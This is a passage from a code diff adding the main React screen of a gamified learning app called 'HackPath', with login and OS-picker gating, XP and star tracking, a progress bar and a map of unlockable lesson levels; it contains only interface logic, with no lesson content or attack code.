+    if (passed) setProgress(p => ({ ...p, [active]: { passed: true, stars: Math.max(stars, p[active]?.stars || 0), xp: Math.max(xp, p[active]?.xp || 0) } }));
+    setActive(null);
+  };
+  const selectOS = (os) => { setUserOS(os); if (user) saveOS(user, os); };
+
+  if (!user) return (<><style>{CSS}</style><Auth onLogin={loginUser} /></>);
+  if (!loaded) return (<><style>{CSS}</style><div className="hp" style={{ justifyContent: "center", textAlign: "center" }}><div style={{ color: "var(--green)" }}>Loading...</div></div></>);
+  if (!userOS) return (<><style>{CSS}</style><OSPicker onSelect={selectOS} /></>);
+  if (active) {
+    const level = ALL_LEVELS.find(l => l.id === active);
+    if (!level) { setActive(null); return null; }
+    return (<><style>{CSS}</style><div className="hp"><LessonSession level={level} userOS={userOS} onComplete={handleComplete} /></div></>);
+  }
+
+  const completedCount = PATH.filter(id => progress[id]?.passed).length;
+  const pct = Math.round((completedCount / PATH.length) * 100);
+
+  return (
+    <><style>{CSS}</style>
+      <div className="hp">
+        <div className="hdr">
+          <h1>{">"}_HackPath</h1>
+          <div style={{ display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
+            <span className="xp-badge">{"\u26A1"} {totalXP} XP</span>
+            <button className="btn sm sec" onClick={() => { setUserOS(null); if (user) saveOS(user, null); }}>OS</button>
+            <button className="btn sm sec" onClick={() => { setUser(null); setProgress({}); setUserOS(null); setLoaded(false); }}>Logout</button>
+          </div>
+        </div>
+        {nextLevel ? (
+          <button className="btn full" style={{ marginBottom: 16, fontSize: "1rem", padding: 14 }} onClick={() => { SFX.tap(); setActive(nextLevel); }}>{"\u25B6"} Continue Learning</button>
+        ) : (
+          <div className="round-card" style={{ textAlign: "center", marginBottom: 16, background: "linear-gradient(135deg,#166534,#14532d)" }}>
+            <div style={{ fontSize: "1.3rem", fontWeight: 800 }}>{"\uD83C\uDF93"} All Complete!</div>
+            <div style={{ fontSize: ".85rem", color: "var(--textDim)", marginTop: 4 }}>You finished all {PATH.length} levels!</div>
+          </div>
+        )}
+        <div style={{ display: "flex", justifyContent: "space-between", fontSize: ".8rem", color: "var(--textDim)" }}>
+          <span>{completedCount}/{PATH.length} levels</span><span>{pct}%</span>
+        </div>
+        <div className="progress-bar" style={{ marginBottom: 16 }}><div className="progress-fill" style={{ width: `${pct}%` }} /></div>
+        {ALL_UNITS.map(unit => {
+          const uLevels = unit.levels;
+          const uDone = uLevels.every(l => progress[l.id]?.passed);
+          const uStarted = uLevels.some(l => progress[l.id]?.passed);
+          return (
+            <div key={unit.id}>
+              <div className="map-unit">{uDone ? "\u2705" : uStarted ? "\uD83D\uDD36" : "\uD83D\uDD12"} {unit.title}<span style={{ display: "block", fontWeight: 400, fontSize: ".65rem", marginTop: 2 }}>{unit.desc}</span></div>
+              <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 8 }}>
+                {uLevels.map((level, li) => {
+                  const pi = PATH.indexOf(level.id);
+                  const unlocked = pi === 0 || progress[PATH[pi - 1]]?.passed;
+                  const done = progress[level.id]?.passed;
+                  const isCurrent = level.id === nextLevel;
+                  const stars = progress[level.id]?.stars || 0;
+                  return (
+                    <div key={level.id} style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 3 }}>
+                      <div className={`map-node ${done ? "done" : isCurrent ? "current" : !unlocked ? "locked" : "current"}`} onClick={() => { if (unlocked) { SFX.tap(); setActive(level.id); } }} title={level.title}>
+                        {done ? "\u2713" : !unlocked ? "\uD83D\uDD12" : li + 1}
+                      </div>
+                      {done && <div style={{ fontSize: ".65rem" }}>{"\u2B50".repeat(stars)}</div>}
+                      <div style={{ fontSize: ".6rem", color: "var(--textDim)", maxWidth: 60, textAlign: "center", lineHeight: 1.2 }}>{level.title}</div>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+          );
+        })}
+        <div style={{ height: 40 }} />
+      </div>
+    </>
+  );
+}
